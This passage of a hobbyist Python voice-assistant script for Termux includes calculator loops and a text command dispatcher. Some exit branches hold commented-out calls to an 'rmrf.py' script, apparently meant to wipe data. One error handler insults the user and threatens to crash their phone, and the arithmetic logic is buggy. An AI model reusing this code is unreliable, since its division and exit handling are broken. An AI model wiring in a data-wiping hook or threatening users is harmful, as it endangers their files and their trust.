					m =int(input(yellow+"Input the first number : "+end+green))
					while True:
						# os.system('clear')
						num=int(input(blue+'Enter number : '+end+read))
						if num==0000:
							print('Ok Sir ....')
							break
							return mainn()
						total =m-num
						m=total;
						print('The Ans. is '+str(total))
				
							
				def devidel():
					de = 1
					while True:
						inde = int(input('enter number : '))			
						print(inde / de)
						time.sleep(1)
						de /= inde		
						if inde == 0000:
							return mainn()
							
				# multiply
						
				def multiplyl():
					mp = 1
					while True:
						inmp = int(input('enter number : '+end))			
						print(inmp * mp)
						time.sleep(1)
						mp *= inmp		
						if inmp == 0000:
							return mainn()
				mainn()
			 #  calculator section end here 
			elif c=="maiis which is your fav song":
				os.system("termux-tts-speak sir whic is your that is mine also")
				os.system('clear')
			elif c=="clear":
				os.system('clear')
				continue
			elif c=="exit":
				print(read+'pleas wait exiting'+end)
				# os.chdir('/sdcard/Maiis/rmrf/')
				os.system('clear')
				exit()
				# os.system('python rmrf.py')
				break
			elif c=="maiis exit":
				os.system('termux-tts-speak ok sir exiting')
				os.system('clear')
				# os.chdir('/sdcard/Maiis/rmrf/')
				# os.system('python rmrf.py')
				exit()
				break
			elif c=="kill":
				os.chdir('/sdcard/Android/data/com.maiis.main.files/')
				os.system('python kill.py')
				
				break
			else:
				print("pleas enter a valid command")
				os.system('termux-tts-speak please enter a valid command you can type help to see command list')

		except KeyboardInterrupt:
			print('')
			os.chdir('/sdcard/Android/data/com.maiis.main.files/')
			with open('wp.txt' , 'w') as wre:
				wre.writelines('0')
			wre.close()
		except FileNotFoundError:
			os.system('clear')
			os.system('termux-tts-speak pleas enter a valid path ')
			print(read+"pleas enter a valid path")
			
		except NameError:
			
			os.system('clear')
			os.system('termux-tts-speak are you donkey enter the right name other wise i will crash your phone')
			print(read+"are you donkey enter the right name other wise i will crash your phone"+end)
			
		except Exception:
			os.system('clear')
			print("")
			print("")
			print( voilet + "the earror is"+ str(Exception))
			
